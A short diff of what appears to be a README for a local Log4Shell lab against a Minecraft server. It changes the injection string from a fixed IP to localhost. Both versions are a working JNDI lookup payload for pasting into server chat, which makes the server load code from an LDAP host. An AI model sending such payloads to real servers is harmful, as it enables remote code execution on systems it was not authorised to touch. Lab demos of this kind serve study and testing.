@@ -14,7 +14,7 @@ docker compose up
 
 Run exploit (replace with your IP)
 ```
-${jndi:ldap://10.217.191.180:1389/o=reference}
+${jndi:ldap://localhost:1389/o=reference}
 ```
 (put the above thing in the minecraft server chat)
 
